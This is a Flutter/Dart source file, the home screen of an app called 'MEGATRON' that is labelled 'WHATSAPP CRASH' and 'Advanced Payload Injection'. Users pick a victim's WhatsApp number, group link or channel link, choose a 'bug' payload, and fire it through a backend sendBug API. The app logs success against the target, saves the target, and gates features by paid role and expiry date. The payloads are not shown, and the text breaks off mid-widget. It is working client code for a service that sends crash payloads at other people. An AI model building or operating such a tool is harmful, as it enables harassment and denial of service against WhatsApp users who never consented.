import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'attack_countdown_overlay.dart';
import 'api.dart';
import 'package:darkverse/theme/app_theme.dart';

class HomePage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;

  const HomePage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  late AnimationController _pulseController;
  late VideoPlayerController _videoController;
  String selectedBugId = "";

  String _selectedBugMode = "number";
  String _senderMode = "private";
  int _privateSenderCount = 0;
  int _globalSenderCount = 0;
  bool _isSending = false;
  bool _isPrivateActive = true;
  bool _isLoadingHistory = false;
  List<Map<String, dynamic>> _history = [];

  List<String> _customBugIds = [];
  int _customLoop = 1;
  int _customSleep = 0;
  final TextEditingController _loopController = TextEditingController(text: "1");
  final TextEditingController _sleepController = TextEditingController(text: "0");

  String? _selectedMenu;

  List<String> _savedTargets = [];
  static const int _maxSavedTargets = 10;

  String _selectedCountryCode = '+62';
  String _selectedCountryFlag = '\uD83C\uDDEE\uD83C\uDDF3';

  static const List<Map<String, String>> _countryCodes = [
    {'code': '+62', 'flag': '\uD83C\uDDEE\uD83C\uDDF3', 'name': 'Indonesia'},
    {'code': '+1', 'flag': '\uD83C\uDDFA\uD83C\uDDF8', 'name': 'United States'},
    {'code': '+44', 'flag': '\uD83C\uDDEC\uD83C\uDDE7', 'name': 'United Kingdom'},
    {'code': '+91', 'flag': '\uD83C\uDDEE\uD83C\uDDF3', 'name': 'India'},
    {'code': '+81', 'flag': '\uD83C\uDDEF\uD83C\uDDF5', 'name': 'Japan'},
    {'code': '+82', 'flag': '\uD83C\uDDF0\uD83C\uDDF7', 'name': 'South Korea'},
    {'code': '+86', 'flag': '\uD83C\uDDE8\uD83C\uDDF3', 'name': 'China'},
    {'code': '+7', 'flag': '\uD83C\uDDF7\uD83C\uDDFA', 'name': 'Russia'},
    {'code': '+55', 'flag': '\uD83C\uDDE7\uD83C\uDDF7', 'name': 'Brazil'},
    {'code': '+52', 'flag': '\uD83C\uDDF2\uD83C\uDDFD', 'name': 'Mexico'},
    {'code': '+34', 'flag': '\uD83C\uDDEA\uD83C\uDDF8', 'name': 'Spain'},
    {'code': '+33', 'flag': '\uD83C\uDDEB\uD83C\uDDF7', 'name': 'France'},
    {'code': '+49', 'flag': '\uD83C\uDDE9\uD83C\uDDEA', 'name': 'Germany'},
    {'code': '+39', 'flag': '\uD83C\uDDEE\uD83C\uDDF9', 'name': 'Italy'},
    {'code': '+61', 'flag': '\uD83C\uDDE6\uD83C\uDDFA', 'name': 'Australia'},
    {'code': '+64', 'flag': '\uD83C\uDDF3\uD83C\uDDFF', 'name': 'New Zealand'},
    {'code': '+65', 'flag': '\uD83C\uDDF8\uD83C\uDDEC', 'name': 'Singapore'},
    {'code': '+60', 'flag': '\uD83C\uDDF2\uD83C\uDDFE', 'name': 'Malaysia'},
    {'code': '+63', 'flag': '\uD83C\uDDF5\uD83C\uDDED', 'name': 'Philippines'},
    {'code': '+66', 'flag': '\uD83C\uDDF9\uD83C\uDDED', 'name': 'Thailand'},
    {'code': '+84', 'flag': '\uD83C\uDDFB\uD83C\uDDF3', 'name': 'Vietnam'},
    {'code': '+886', 'flag': '\uD83C\uDDF9\uD83C\uDDFC', 'name': 'Taiwan'},
    {'code': '+852', 'flag': '\uD83C\uDDED\uD83C\uDDF0', 'name': 'Hong Kong'},
    {'code': '+971', 'flag': '\uD83C\uDDE6\uD83C\uDDEA', 'name': 'UAE'},
    {'code': '+966', 'flag': '\uD83C\uDDF8\uD83C\uDDE6', 'name': 'Saudi Arabia'},
    {'code': '+90', 'flag': '\uD83C\uDDF9\uD83C\uDDF7', 'name': 'Turkey'},
    {'code': '+20', 'flag': '\uD83C\uDDEA\uD83C\uDDEC', 'name': 'Egypt'},
    {'code': '+234', 'flag': '\uD83C\uDDF3\uD83C\uDDEC', 'name': 'Nigeria'},
    {'code': '+27', 'flag': '\uD83C\uDDFF\uD83C\uDDE6', 'name': 'South Africa'},
    {'code': '+254', 'flag': '\uD83C\uDDF0\uD83C\uDDEA', 'name': 'Kenya'},
    {'code': '+212', 'flag': '\uD83C\uDDF2\uD83C\uDDE6', 'name': 'Morocco'},
    {'code': '+351', 'flag': '\uD83C\uDDF5\uD83C\uDDF9', 'name': 'Portugal'},
    {'code': '+31', 'flag': '\uD83C\uDDF3\uD83C\uDDF1', 'name': 'Netherlands'},
    {'code': '+46', 'flag': '\uD83C\uDDF8\uD83C\uDDEA', 'name': 'Sweden'},
    {'code': '+47', 'flag': '\uD83C\uDDF3\uD83C\uDDF4', 'name': 'Norway'},
    {'code': '+45', 'flag': '\uD83C\uDDE9\uD83C\uDDF0', 'name': 'Denmark'},
    {'code': '+358', 'flag': '\uD83C\uDDEB\uD83C\uDDEE', 'name': 'Finland'},
    {'code': '+48', 'flag': '\uD83C\uDDF5\uD83C\uDDF1', 'name': 'Poland'},
    {'code': '+420', 'flag': '\uD83C\uDDE8\uD83C\uDDFF', 'name': 'Czech Republic'},
    {'code': '+43', 'flag': '\uD83C\uDDE6\uD83C\uDDF9', 'name': 'Austria'},
    {'code': '+41', 'flag': '\uD83C\uDDE8\uD83C\uDDED', 'name': 'Switzerland'},
    {'code': '+32', 'flag': '\uD83C\uDDE7\uD83C\uDDEA', 'name': 'Belgium'},
    {'code': '+352', 'flag': '\uD83C\uDDF1\uD83C\uDDFA', 'name': 'Luxembourg'},
    {'code': '+353', 'flag': '\uD83C\uDDEE\uD83C\uDDEA', 'name': 'Ireland'},
    {'code': '+380', 'flag': '\uD83C\uDDFA\uD83C\uDDE6', 'name': 'Ukraine'},
    {'code': '+40', 'flag': '\uD83C\uDDF7\uD83C\uDDF4', 'name': 'Romania'},
    {'code': '+36', 'flag': '\uD83C\uDDED\uD83C\uDDFA', 'name': 'Hungary'},
    {'code': '+30', 'flag': '\uD83C\uDDEC\uD83C\uDDF7', 'name': 'Greece'},
  ];

  @override
  void initState() {
    super.initState();
    _pulseController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1000),
    )..repeat(reverse: true);

    _videoController = VideoPlayerController.asset('assets/videos/bug.mp4')
      ..initialize().then((_) {
        setState(() {});
        _videoController.setLooping(true);
        _videoController.setVolume(1.0);
        _videoController.play();
      }).catchError((e) {
        debugPrint("Video init error: $e");
      });

    if (widget.listBug.isNotEmpty) {
      final initialBugs = _getFilteredBugs();
      if (initialBugs.isNotEmpty) {
        selectedBugId = initialBugs[0]['bug_id'];
      }
    }

    _fetchSenderStats();
    _fetchHistory();
    _loadSavedTargets();
  }

  Future<void> _loadSavedTargets() async {
    final prefs = await SharedPreferences.getInstance();
    setState(() {
      _savedTargets = prefs.getStringList('saved_targets') ?? [];
    });
  }

  Future<void> _saveTarget(String target) async {
    if (target.isEmpty) return;
    if (_savedTargets.contains(target)) return;
    setState(() {
      _savedTargets.insert(0, target);
      if (_savedTargets.length > _maxSavedTargets) {
        _savedTargets = _savedTargets.sublist(0, _maxSavedTargets);
      }
    });
    final prefs = await SharedPreferences.getInstance();
    await prefs.setStringList('saved_targets', _savedTargets);
  }

  Future<void> _removeTarget(int index) async {
    setState(() {
      _savedTargets.removeAt(index);
    });
    final prefs = await SharedPreferences.getInstance();
    await prefs.setStringList('saved_targets', _savedTargets);
  }

  List<Map<String, dynamic>> _getFilteredBugs() {
    if (_selectedBugMode == "group") {
      return widget.listBug.where((b) => b['bug_id'].contains('_group')).toList();
    } else if (_selectedBugMode == "channel") {
      return widget.listBug.where((b) => b['bug_id'].contains('_channel')).toList();
    } else {
      return widget.listBug.where((b) => !b['bug_id'].contains('_group') && !b['bug_id'].contains('_channel')).toList();
    }
  }

  Future<void> _fetchSenderStats() async {
    try {
      final res = await http.get(Uri.parse(
          "${ApiConfig.baseUrl}/getSenderStats?key=${widget.sessionKey}"));
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (data['valid'] == true) {
          setState(() {
            _privateSenderCount = data['private'] ?? 0;
            _globalSenderCount = data['global'] ?? 0;
            _isPrivateActive = data['private_active'] ?? true;
          });
        }
      }
    } catch (e) {
      debugPrint("Error fetching sender stats: $e");
    }
  }

  Future<void> _fetchHistory() async {
    setState(() => _isLoadingHistory = true);
    try {
      final res = await http.get(Uri.parse(
          "${ApiConfig.baseUrl}/getHistory?key=${widget.sessionKey}"));
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (data['valid'] == true && data['history'] != null) {
          setState(() {
            _history = List<Map<String, dynamic>>.from(data['history']);
          });
        }
      }
    } catch (e) {
      debugPrint("Error fetching history: $e");
    } finally {
      setState(() => _isLoadingHistory = false);
    }
  }

  @override
  void dispose() {
    _pulseController.dispose();
    _videoController.dispose();
    targetController.dispose();
    _menuPageController.dispose();
    _loopController.dispose();
    _sleepController.dispose();
    super.dispose();
  }

  String? formatPhoneNumber(String input) {
    final cleaned = input.replaceAll(RegExp(r'[^\d+]'), '');
    if (cleaned.length < 6) return null;
    return cleaned;
  }

  bool isValidGroupLink(String input) {
    return input.contains('chat.whatsapp.com') && input.contains('https://');
  }

  bool isValidChannelLink(String input) {
    return input.contains('whatsapp.com/channel/') && input.contains('https://');
  }

  Future<void> _sendBug() async {
    var rawInput = targetController.text.trim();
    final key = widget.sessionKey;

    if (_selectedBugMode == "number") {
      final numberOnly = targetController.text.trim();
      if (numberOnly.isEmpty || key.isEmpty) {
        _showAlert("Invalid Number", "Masukkan nomor telepon.");
        return;
      }
      rawInput = "$_selectedCountryCode$numberOnly";
    } else if (_selectedBugMode == "channel") {
      if (!isValidChannelLink(rawInput)) {
        _showAlert("Invalid Link", "Masukkan link channel WA yang valid (contoh: https://whatsapp.com/channel/...).");
        return;
      }
    } else {
      if (!isValidGroupLink(rawInput)) {
        _showAlert("Invalid Link", "Masukkan link group WA yang valid (contoh: https://chat.whatsapp.com/...).");
        return;
      }
    }

    final currentBugs = _getFilteredBugs();
    if (!currentBugs.any((b) => b['bug_id'] == selectedBugId)) {
      if (currentBugs.isNotEmpty) {
        setState(() { selectedBugId = currentBugs[0]['bug_id']; });
      } else {
        _showAlert("Error", "Tidak ada bug tersedia untuk mode ini.");
        return;
      }
    }

    setState(() { _isSending = true; });

    final targetName = rawInput;
    await AttackCountdownOverlay.show(
      context,
      targetName: targetName,
      onComplete: () async {
        final effectiveSenderMode = (widget.role == 'developer' || widget.role == 'all_akses' || widget.role == 'owner' || widget.role == 'vip') ? _senderMode : 'private';

        try {
          final res = await http.get(Uri.parse(
              "${ApiConfig.baseUrl}/sendBug?key=$key&target=$rawInput&bug=$selectedBugId&senderMode=$effectiveSenderMode"));
          final data = jsonDecode(res.body);

          if (!mounted) return;
          if (data["cooldown"] == true) {
            _showAlert("Cooldown", "Tunggu beberapa saat sebelum mengirim lagi.");
            _addToHistory(rawInput, selectedBugId, "Cooldown", false);
          } else if (data["valid"] == false) {
            _showAlert("Key Invalid", "Sesi Anda tidak valid. Silakan login ulang.");
            _addToHistory(rawInput, selectedBugId, "Invalid Key", false);
          } else if (data["sended"] == false) {
            _showAlert("Gagal", "Server sedang maintenance atau terjadi kegagalan.");
            _addToHistory(rawInput, selectedBugId, "Failed", false);
          } else {
            _showAlert("Berhasil", "Bug sukses dikirim ke target!");
            _saveTarget(rawInput);
            targetController.clear();
            _fetchSenderStats();
            _addToHistory(rawInput, selectedBugId, "Success", true);
          }
        } catch (_) {
          if (mounted) {
            _showAlert("Error", "Terjadi kesalahan pada sistem. Coba lagi nanti.");
            _addToHistory(rawInput, selectedBugId, "Error", false);
          }
        } finally {
          if (mounted) setState(() { _isSending = false; });
        }
      },
    );
  }

  void _addToHistory(String target, String bugId, String status, bool success) {
    setState(() {
      _history.insert(0, {
        'target': target,
        'bug_id': bugId,
        'status': status,
        'success': success,
        'time': DateTime.now().toIso8601String(),
      });
      if (_history.length > 50) {
        _history.removeLast();
      }
    });
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      barrierDismissible: true,
      builder: (_) => AlertDialog(
        backgroundColor: AppTheme.bgCard,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(AppTheme.radiusM),
          side: const BorderSide(color: AppTheme.borderSubtle, width: 1),
        ),
        title: Text(title, style: AppTheme.headingM),
        content: Text(msg, style: AppTheme.bodyL),
        actions: [
          Container(
            decoration: BoxDecoration(
              color: AppTheme.gold,
              borderRadius: const BorderRadius.only(
                bottomLeft: Radius.circular(AppTheme.radiusM),
                bottomRight: Radius.circular(AppTheme.radiusM),
              ),
            ),
            child: TextButton(
              onPressed: () => Navigator.pop(context),
              child: const Text("OK", style: TextStyle(color: AppTheme.bgDeep, fontWeight: FontWeight.w800, fontSize: 14)),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildTopAppBar() {
    return Container(
      padding: const EdgeInsets.symmetric(vertical: 12),
      child: Center(
        child: Container(
          padding: const EdgeInsets.symmetric(horizontal: 28, vertical: 10),
          decoration: AppTheme.cardDecor(),
          child: Text(
            "MEGATRON",
            style: AppTheme.headingL.copyWith(letterSpacing: 3.0),
          ),
        ),
      ),
    );
  }

  Widget _buildTopHeader() {
    return Container(
      padding: const EdgeInsets.all(20),
      decoration: AppTheme.cardDecor(accent: AppTheme.mint),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(
              color: AppTheme.bgCard,
              borderRadius: BorderRadius.circular(AppTheme.radiusS),
              boxShadow: AppTheme.softGlow(AppTheme.mint),
            ),
            child: const Icon(Icons.bug_report_rounded, color: AppTheme.mint, size: 28),
          ),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text("WHATSAPP CRASH", style: AppTheme.headingL),
                const SizedBox(height: 4),
                Text("Advanced Payload Injection", style: AppTheme.bodyM),
                const SizedBox(height: 8),
                Row(
                  children: [
                    _buildBadge(widget.role.toUpperCase(), AppTheme.lavender),
                    const SizedBox(width: 8),
                    _buildBadge(widget.expiredDate, AppTheme.sky),
                  ],
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildBadge(String text, Color color) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
      decoration: BoxDecoration(
        color: color.withValues(alpha: 0.15),
        borderRadius: BorderRadius.circular(AppTheme.radiusS),
        border: Border.all(color: color.withValues(alpha: 0.3)),
        boxShadow: AppTheme.softGlow(color, blur: 8, opacity: 0.1),
      ),
      child: Text(text, style: TextStyle(color: color, fontSize: 10, fontWeight: FontWeight.w700, letterSpacing: 0.5)),
    );
  }

  Widget _buildVideoBox() {
    return Container(
      height: 200,
      width: double.infinity,
      clipBehavior: Clip.antiAlias,
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(AppTheme.radiusM),
        boxShadow: AppTheme.cardShadow,
      ),
      child: Stack(
        children: [
          Positioned.fill(
            child: _buildVideoPlayerSafe(),
          ),
          Positioned(
            top: 10, left: 10,
            child: AnimatedBuilder(
              animation: _pulseController,
              builder: (context, child) {
                return Container(
                  padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
                  decoration: BoxDecoration(
                    color: AppTheme.coral,
                    borderRadius: BorderRadius.circular(AppTheme.radiusS),
                    boxShadow: AppTheme.softGlow(AppTheme.coral, blur: 12),
                  ),
                  child: Row(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      Container(width: 6, height: 6, decoration: const BoxDecoration(color: Colors.white, shape: BoxShape.circle)),
                      const SizedBox(width: 5),
                      const Text("LIVE", style: TextStyle(color: Colors.white, fontSize: 9, fontWeight: FontWeight.w700, letterSpacing: 1)),
                    ],
                  ),
                );
              },
            ),
          ),
          Positioned(
            top: 10, right: 10,
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
              decoration: BoxDecoration(
                color: AppTheme.bgCard,
                borderRadius: BorderRadius.circular(AppTheme.radiusS),
              ),
              child: const Text("HD", style: TextStyle(color: AppTheme.textPrimary, fontSize: 9, fontWeight: FontWeight.w700)),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildVideoPlayerSafe() {
    try {
      if (_videoController.value.isInitialized) {
        return FittedBox(
          fit: BoxFit.cover,
          child: SizedBox(
            width: _videoController.value.size.width,
            height: _videoController.value.size.height,
            child: VideoPlayer(_videoController),
          ),
        );
      }
    } catch (_) {}
    return Container(
      color: AppTheme.bgDeep,
      child: const Center(
        child: CircularProgressIndicator(color: AppTheme.gold, strokeWidth: 3),
      ),
    );
  }

  Widget _buildStatsWidget() {
    return Container(
      padding: const EdgeInsets.symmetric(vertical: 16, horizontal: 8),
      decoration: AppTheme.cardDecor(accent: AppTheme.gold),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceEvenly,
        children: [
          _buildStatItem(widget.listBug.length.toString(), "Total Bugs", Icons.bug_report_outlined, AppTheme.coral),
          Container(width: 1, height: 32, color: AppTheme.borderSubtle),
          _buildStatItem("GACOR", "Success Rate", Icons.trending_up_rounded, AppTheme.mint),
          Container(width: 1, height: 32, color: AppTheme.borderSubtle),
          _buildStatItem("ACTIVE", "Status", Icons.radio_button_checked_rounded, AppTheme.sky),
        ],
      ),
    );
  }

  Widget _buildStatItem(String mainText, String subtitle, IconData icon, Color color) {
    return Column(
      children: [
        Container(
          padding: const EdgeInsets.all(6),
          decoration: BoxDecoration(
            color: AppTheme.bgCard,
            borderRadius: BorderRadius.circular(AppTheme.radiusS),
            boxShadow: AppTheme.softGlow(color, blur: 10),
            border: Border.all(color: color.withValues(alpha: 0.3)),
          ),
          child: Icon(icon, color: color, size: 18),
        ),
        const SizedBox(height: 6),
        Text(mainText, style: AppTheme.headingM.copyWith(fontSize: 16)),
        const SizedBox(height: 2),
        Text(subtitle, style: AppTheme.caption),
      ],
    );
  }

  Widget _buildTargetTypeSelector() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        _sectionLabel("TARGET TYPE", AppTheme.sky),
        Row(
          children: [
            Expanded(
              child: _buildBugModeCard(
                mode: "number",
                icon: Icons.person_rounded,
                title: "BUG NOMOR",
                subtitle: "Personal target",
                color: AppTheme.sky,
                isSelected: _selectedBugMode == "number",
              ),
            ),
            const SizedBox(width: 12),
            Expanded(
              child: _buildBugModeCard(
                mode: "group",
                icon: Icons.group_rounded,
                title: "BUG GROUP",
                subtitle: "Group target",
                color: AppTheme.coral,
                isSelected: _selectedBugMode == "group",
              ),
            ),
            const SizedBox(width: 12),
            Expanded(
              child: _buildBugModeCard(
                mode: "channel",
                icon: Icons.campaign_rounded,
                title: "BUG CHANNEL",
                subtitle: "Channel target",
                color: AppTheme.mint,
                isSelected: _selectedBugMode == "channel",
              ),
            ),
          ],
        ),
      ],
    );
  }

  Widget _buildBugModeCard({
    required String mode,
    required IconData icon,
    required String title,
    required String subtitle,
    required Color color,
    required bool isSelected,
  }) {
    return GestureDetector(
      onTap: () {
        setState(() {
          _selectedBugMode = mode;
          targetController.clear();
          final newBugs = _getFilteredBugs();
          if (newBugs.isNotEmpty) selectedBugId = newBugs[0]['bug_id'];
        });
      },
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 200),
        padding: const EdgeInsets.symmetric(vertical: 20, horizontal: 12),
        decoration: isSelected
            ? AppTheme.accentCardDecor(color)
            : AppTheme.cardDecor(),
        child: Column(
          children: [
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: isSelected ? color.withValues(alpha: 0.2) : AppTheme.bgCard,
                borderRadius: BorderRadius.circular(AppTheme.radiusS),
                boxShadow: isSelected ? AppTheme.softGlow(color) : [],
              ),
              child: Icon(
                icon,
                color: isSelected ? color : AppTheme.textMuted,
                size: 24,
              ),
            ),
            const SizedBox(height: 10),
            Text(
              title,
              style: TextStyle(
                color: isSelected ? AppTheme.textPrimary : AppTheme.textSecondary,
                fontSize: 13,
                fontWeight: FontWeight.w800,
                letterSpacing: 1,
              ),
              textAlign: TextAlign.center,
            ),
            const SizedBox(height: 3),
            Text(
              subtitle,
              style: AppTheme.caption,
              textAlign: TextAlign.center,
            ),
            const SizedBox(height: 8),
            if (isSelected)
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                decoration: BoxDecoration(
                  color: color.withValues(alpha: 0.15),
                  borderRadius: BorderRadius.circular(AppTheme.radiusS),
                  border: Border.all(color: color.withValues(alpha: 0.3)),
                ),
                child: Text(
                  "SELECTED",
                  style: TextStyle(
                    color: color,
                    fontSize: 8,
                    fontWeight: FontWeight.w800,
                    letterSpacing: 2,
                  ),
                ),
              ),
          ],
        ),
      ),
    );
  }

  Widget _buildSenderModeSelector() {
    final isActive = _senderMode == "private" ? _isPrivateActive : _globalSenderCount > 0;
    final count = _senderMode == "private" ? _privateSenderCount : _globalSenderCount;
    final statusColor = isActive ? AppTheme.mint : AppTheme.coral;
    return GestureDetector(
      onTap: _showSenderSelectionPopup,
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
        decoration: AppTheme.cardDecor(),
        child: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: AppTheme.bgCard,
                borderRadius: BorderRadius.circular(AppTheme.radiusS),
                boxShadow: AppTheme.softGlow(statusColor, blur: 8, opacity: 0.1),
              ),
              child: Icon(
                _senderMode == "private" ? Icons.lock_outline_rounded : Icons.public_rounded,
                color: statusColor, size: 20,
              ),
            ),
            const SizedBox(width: 14),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Text("SENDER MODE", style: AppTheme.label.copyWith(fontSize: 9)),
                      const SizedBox(width: 8),
                      _buildBadge(isActive ? "Active" : "Inactive", statusColor),
                    ],
                  ),
                  const SizedBox(height: 3),
                  Text(_senderMode == "private" ? "PRIVATE SENDER" : "GLOBAL SENDER", style: AppTheme.headingM),
                  const SizedBox(height: 2),
                  Row(
                    children: [
                      Container(width: 6, height: 6, decoration: BoxDecoration(color: statusColor, shape: BoxShape.circle)),
                      const SizedBox(width: 5),
                      Text("$count Sender Active", style: AppTheme.bodyM),
                    ],
                  ),
                ],
              ),
            ),
            const Icon(Icons.arrow_forward_ios, color: AppTheme.textMuted, size: 16),
          ],
        ),
      ),
    );
  }

  Widget _buildInputPanel() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Text(
          _selectedBugMode == "number"
              ? "TARGET NUMBER"
              : _selectedBugMode == "channel"
                  ? "WHATSAPP CHANNEL LINK"
                  : "WHATSAPP GROUP LINK",
          style: AppTheme.label,
        ),
        const SizedBox(height: 8),
        Container(
          decoration: AppTheme.cardDecor(),
          child: _selectedBugMode == "number"
              ? Row(
                  children: [
                    GestureDetector(
                      onTap: _showCountryCodePicker,
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 16),
                        decoration: const BoxDecoration(
                          border: Border(right: BorderSide(color: AppTheme.borderSubtle, width: 1)),
                        ),
                        child: Row(
                          mainAxisSize: MainAxisSize.min,
                          children: [
                            Text(_selectedCountryFlag, style: const TextStyle(fontSize: 18)),
                            const SizedBox(width: 4),
                            Text(_selectedCountryCode, style: const TextStyle(color: AppTheme.textPrimary, fontSize: 14, fontWeight: FontWeight.w700)),
                            const SizedBox(width: 2),
                            const Icon(Icons.unfold_more_rounded, color: AppTheme.textMuted, size: 14),
                          ],
                        ),
                      ),
                    ),
                    Expanded(
                      child: TextField(
                        controller: targetController,
                        style: const TextStyle(color: AppTheme.textPrimary, fontSize: 14, fontWeight: FontWeight.w700),
                        cursorColor: AppTheme.sky,
                        keyboardType: TextInputType.phone,
                        decoration: InputDecoration(
                          hintText: "8xxxxxxxxxx",
                          hintStyle: const TextStyle(color: AppTheme.textMuted, fontSize: 13),
                          border: InputBorder.none,
                          prefixIcon: const Padding(
                            padding: EdgeInsets.all(14),
                            child: Icon(Icons.phone_android_rounded, color: AppTheme.textMuted, size: 20),
                          ),
                          suffixIcon: targetController.text.isNotEmpty
                              ? GestureDetector(
                                  onTap: () => setState(() => targetController.clear()),
                                  child: Padding(
                                    padding: const EdgeInsets.all(12),
                                    child: Container(
                                      padding: const EdgeInsets.all(4),
                                      decoration: BoxDecoration(
                                        color: AppTheme.coral.withValues(alpha: 0.15),
                                        borderRadius: BorderRadius.circular(AppTheme.radiusS),
                                      ),
                                      child: const Icon(Icons.close_rounded, color: AppTheme.coral, size: 14),
                                    ),
                                  ),
                                )
                              : null,
                          contentPadding: const EdgeInsets.symmetric(vertical: 16, horizontal: 12),
                        ),
                      ),
                    ),
                  ],
                )
              : TextField(
                  controller: targetController,
                  style: const TextStyle(color: AppTheme.textPrimary, fontSize: 14, fontWeight: FontWeight.w700),
                  cursorColor: AppTheme.sky,
                  keyboardType: TextInputType.url,
                  decoration: InputDecoration(
                    hintText: _selectedBugMode == "channel"
                        ? "e.g. https://whatsapp.com/channel/..."
                        : "e.g. https://chat.whatsapp.com/...",
                    hintStyle: const TextStyle(color: AppTheme.textMuted, fontSize: 13),
                    border: InputBorder.none,
                    prefixIcon: const Padding(
                      padding: EdgeInsets.all(14),
                      child: Icon(Icons.link_rounded, color: AppTheme.textMuted, size: 20),
                    ),
                    contentPadding: EdgeInsets.symmetric(vertical: 16, horizontal: 12),
                  ),
                ),
        ),
      ],
    );
  }

  Widget _buildPayloadDropdown() {
    final availableBugs = _getFilteredBugs();
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Row(
          children: [
            _sectionLabel(
              _selectedBugMode == "number"
                  ? "BUG NOMOR"
                  : _selectedBugMode == "channel"
                      ? "BUG CHANNEL"
                      : "BUG GROUP",
              _selectedBugMode == "number"
                  ? AppTheme.sky
                  : _selectedBugMode == "channel"
                      ? AppTheme.mint
                      : AppTheme.coral,
            ),
            const Spacer(),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
              decoration: BoxDecoration(
                color: (_selectedBugMode == "number"
                        ? AppTheme.sky
                        : _selectedBugMode == "channel"
                            ? AppTheme.mint
                            : AppTheme.coral)
                    .withValues(alpha: 0.15),
                borderRadius: BorderRadius.circular(AppTheme.radiusS),
                border: Border.all(
                    color: (_selectedBugMode == "number"
                            ? AppTheme.sky
                            : _selectedBugMode == "channel"
                                ? AppTheme.mint
                                : AppTheme.coral)
                        .withValues(alpha: 0.3)),
              ),
              child: Text(
                "${availableBugs.length} available",
                style: TextStyle(
                  color: _selectedBugMode == "number"
                      ? AppTheme.sky
                      : _selectedBugMode == "channel"
                          ? AppTheme.mint
                          : AppTheme.coral,
                  fontSize: 8,
                  fontWeight: FontWeight.w800,
                  letterSpacing: 1,
                ),
              ),
            ),
          ],
        ),
        const SizedBox(height: 10),
        if (availableBugs.isEmpty)
          Container(
            padding: const EdgeInsets.all(20),
            decoration: AppTheme.cardDecor(),
            child: Center(
              child: Column(
                children: [
                  Icon(
                    _selectedBugMode == "number"
                        ? Icons.person_off_rounded
                        : _selectedBugMode == "channel"
                            ? Icons.campaign_rounded
                            : Icons.group_off_rounded,
                    color: AppTheme.textMuted,
                    size: 32,
                  ),
                  const SizedBox(height: 8),
                  Text(
                    _selectedBugMode == "number"
                        ? "No number bugs available"
                        : "No group bugs available",
                    style: AppTheme.bodyM,
                  ),
                ],
              ),
            ),
          )
        else
          ...availableBugs.map((bug) {
            final isSelected = selectedBugId == bug['bug_id'];
            final modeColor = _selectedBugMode == "number" ? AppTheme.sky : AppTheme.coral;
            return Padding(
              padding: const EdgeInsets.only(bottom: 10),
              child: GestureDetector(
                onTap: () {
                  setState(() {
                    selectedBugId = bug['bug_id'];
                  });
                },
                child: AnimatedContainer(
                  duration: const Duration(milliseconds: 200),
                  decoration: isSelected
                      ? AppTheme.accentCardDecor(modeColor)
                      : AppTheme.cardDecor(),
                  child: Column(
                    children: [
                      if (isSelected)
                        ClipRRect(
                          borderRadius: BorderRadius.vertical(top: Radius.circular(AppTheme.radiusM)),
                          child: Container(
                            height: 120,
                            width: double.infinity,
                            color: AppTheme.bgDeep,
                            child: _BugVideoPreview(bugId: bug['bug_id'] ?? ''),
                          ),
                        ),
                      Padding(
                        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
                        child: Row(
                          children: [
                            Container(
                              padding: const EdgeInsets.all(6),
                              decoration: BoxDecoration(
                                color: isSelected ? modeColor.withValues(alpha: 0.2) : AppTheme.bgCard,
                                borderRadius: BorderRadius.circular(AppTheme.radiusS),
                                boxShadow: isSelected ? AppTheme.softGlow(modeColor, blur: 8, opacity: 0.1) : [],
                              ),
                              child: Icon(
                                _selectedBugMode == "number"
                                    ? Icons.bug_report_rounded
                                    : Icons.group_rounded,
                                color: isSelected ? modeColor : AppTheme.textMuted,
                                size: 16,
                              ),
                            ),
                            const SizedBox(width: 12),
                            Expanded(
                              child: Column(
                                crossAxisAlignment: CrossAxisAlignment.start,
                                children: [
                                  Text(
                                    bug['bug_name'] ?? "Unknown",
                                    style: TextStyle(
                                      color: isSelected ? AppTheme.textPrimary : AppTheme.textSecondary,
                                      fontSize: 13,
                                      fontWeight: FontWeight.w800,
                                    ),
                                  ),
                                  const SizedBox(height: 2),
                                  Text(
                                    bug['bug_id'] ?? "",
                                    style: TextStyle(
                                      color: isSelected
                                          ? AppTheme.textSecondary
                                          : AppTheme.textMuted,
                                      fontSize: 9,
                                      fontWeight: FontWeight.w600,
